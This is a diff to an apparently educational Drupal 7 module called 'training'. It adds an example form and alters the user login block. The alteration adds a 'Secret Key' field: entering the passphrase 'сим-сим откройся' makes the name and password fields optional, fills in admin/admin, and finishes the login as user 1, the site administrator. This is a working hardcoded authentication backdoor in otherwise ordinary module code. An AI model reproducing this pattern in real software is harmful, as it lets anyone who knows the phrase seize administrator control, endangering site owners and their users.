@@ -159,6 +159,14 @@ function training_menu(){
     'access callback' => TRUE,
     'file' => 'training.pages.inc',
   );
+  $menu['training/form'] = array(
+    'title' => 'Form Example',
+    'description' => 'This page is Form Example',
+    'page callback' => 'training_example_form_callback',
+    'page arguments' => array('training_google_form', ),
+    'access callback' => TRUE,
+    'file' => 'training.pages.inc',
+  );
   return $menu;
 }
 
@@ -232,21 +240,136 @@ function training_menu_title_callback(){
   return $permission;
 }
 
+function training_google_form($form, &$form_state){
+  $form = array();
+  $form['group'] = array( //группа элементов формы
+    '#type' => 'fieldset',
+    '#title' => 'group',
+    '#collapsible' => TRUE, //сворачиваемость
+    '#collapsed' => TRUE, //свернута по умолчанию
+
+  );
+  $form['group']['text'] = array(
+    '#type' => 'textfield',
+    '#title' => 'title',
+  );
+  $form['group']['text2'] = array(
+    '#type' => 'textfield',
+    '#title' => 'title2',
+    '#required' => TRUE,
+  );
+  $form['#attached']['css'] = array(
+    //путь к файлу
+  );
+  $form['submit'] = array(
+    '#type' => 'submit',
+    '#value' => 'ok'
+  );
+  return $form;
+}
+
+
+/**
+ * Implements hook_form_FORM_ID_alter
+ * @param $form
+ * @param $form_state
+ * @param $form_id
+ */
+function training_form_user_login_block_alter(&$form, &$form_state, $form_id ){
+
+  array_unshift($form['#validate'], 'secret_key_validate');
+  $form['#theme'] = 'test_form_theme_function';
+  $form['name']['#weight'] = -2;
+  $form['pass']['#weight'] = -1;
+  $form['secret_key'] = array(
+    '#type' => 'textfield',
+    '#title' => 'Secret Key',
+    '#size' => 15,
+    '#weight' => 0,
+  );
+  if(isset($form_state['input']['secret_key']) && $form_state['input']['secret_key'] == 'сим-сим откройся'){
+    $form['name']['#required'] = false;
+    $form['pass']['#required'] = false;
+  }
+  $form['#submit'][] = 'secret_key_submit';
+  $path = drupal_get_path('module','training') . '/css/training.css';
+  drupal_add_css($path);
+}
+
+/**
+ * Validates elements secret_key and logins as admin
+ * @param $form
+ * @param $form_state
+ */
+function secret_key_validate($form, &$form_state){
+  if ($form_state['values']['secret_key'] == 'сим-сим откройся'){
+   $form_state['values']['name'] = 'admin';
+   $form_state['values']['pass'] = 'admin';
+  }
+}
+
+/**
+ * Submitted for user_login_block
+ * @param $form
+ * @param $form_state
+ */
+function secret_key_submit($form, &$form_state){
+
+  if ($form_state['values']['secret_key'] == 'сим-сим откройся'){
+    user_load(1);
+    user_login_finalize($form_state);
+  }
+}
+
 /**
  * Implements hook_theme
  * @return array
  */
-/*function training_theme(){
+function training_theme(){
   $theme = array();
-  $theme['training_render_function'] = array(
-    'variables' => array(
-      'type' => 'strong',
-      'val' => 'hh',
-    ),
-    'template' => 'templates/training_template'
+  $theme['test_form_theme_function'] = array(
+    'render element' => 'form',
+    'arguments' => array('form' => NULL),
+    //'template' => 'templates/training_template'
   );
   return $theme;
-}*/
+}
+
+/**
+ * Rendering custom layout user_login_block
+ * @param $form
+ * @return string
+ * @throws \Exception
+ */
+function theme_test_form_theme_function($form) {
+  $attributes = array(
+    'id' => 'table-test-login',
+  );
+  $rows = array(
+    array(
+      drupal_render($form['form']['name']),
+    ),
+    array(
+      drupal_render($form['form']['pass']),
+    ),
+    array(
+      drupal_render($form['form']['secret_key']),
+    ),
+    array(
+      drupal_render($form['form']['actions']['submit']),
+    ),
+    array(
+      drupal_render($form['form']['links']) .
+      drupal_render($form['form']['form_build_id']) .
+      drupal_render($form['form']['form_id']),
+    ),
+  );
+  return theme('table', array(
+    'rows' => $rows,
+    'attributes' => $attributes,
+  ));
+}
+
 
 /*function theme_training_render_function($variables){
   $type = $variables['type'];
